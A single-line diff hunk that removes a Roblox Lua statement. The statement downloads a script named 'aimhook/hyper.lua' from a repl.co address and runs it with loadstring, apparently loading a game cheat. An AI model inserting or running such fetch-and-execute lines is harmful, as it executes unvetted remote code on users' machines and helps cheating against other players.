@@ -1,1 +1,0 @@
-loadstring(game:HttpGet('https://gangofgang.gog-best.repl.co/aimhook/hyper.lua'))()
